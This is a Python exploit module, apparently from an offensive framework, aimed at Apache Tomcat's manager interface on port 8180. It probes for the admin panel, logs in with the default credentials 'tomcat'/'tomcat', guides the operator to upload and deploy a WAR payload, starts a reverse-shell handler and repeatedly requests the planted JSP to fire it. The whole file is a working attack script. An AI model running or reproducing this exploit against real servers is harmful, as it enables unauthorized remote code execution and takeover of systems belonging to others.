#!/usr/bin/python3

import os
import requests

AUTH_USER           = "tomcat"
AUTH_PASS           = "tomcat"
MANAGER_PATH        = "manager/html"
UPLOAD_PATH         = "manager/html/upload"
PAYLOAD_PATH        = os.path.abspath("payloads/war/payload.war")
PAYLOAD_REMOTE_PATH = "payload/tmp/xyz.jsp"

def create_base_uri(target, port, con_type):
    uri = "%s://%s:%d/" % (con_type, target, port)
    return uri

def query_manager(base_uri, uri):
    req = requests.get(base_uri+uri)
    return req.status_code

def query_creds(url):
    req = requests.get(url, auth=(AUTH_USER, AUTH_PASS))
    if req.status_code != 200:
        return False
    return True

def instruct(url):
    print("    \033[1;32m*\033[00m Target is vulnerable, to exploit:\n\t\033[1;34m-\033[00m Visit %s\n\t\033[1;34m-\033[00m Login with user: %s pass: %s\n\t\033[1;34m-\033[00m Upload war file, use %s\n\t\033[1;34m-\033[00m \
Deploy payload\n\t\033[1;34m-\033[00m Press [ENTER] when completed" % (url, AUTH_USER, AUTH_PASS, PAYLOAD_PATH))
    input()

def run_payload(url):
    print("    \033[1;34m*\033[00m Sending Stage")
    req = requests.get(url)
    while req.status_code != 200:
        req = requests.get(url)

def exploit(args, port, reverse_handler):
    base_uri = create_base_uri(args.target, port, 'http')
    if query_manager(base_uri, MANAGER_PATH) != 401:
        print("cannot find admin panel")
    if query_creds(base_uri+MANAGER_PATH) != True:
        print("incorrect creds")
    instruct(base_uri+UPLOAD_PATH)
    reverse_handler.run()
    run_payload(base_uri+PAYLOAD_REMOTE_PATH)

def run(args, data, reverse_handler):
    print("\033[1;34m[*]\033[00m Attempting exploit: tomcat_mgr_deploy")
    exploit(args, 8180, reverse_handler)
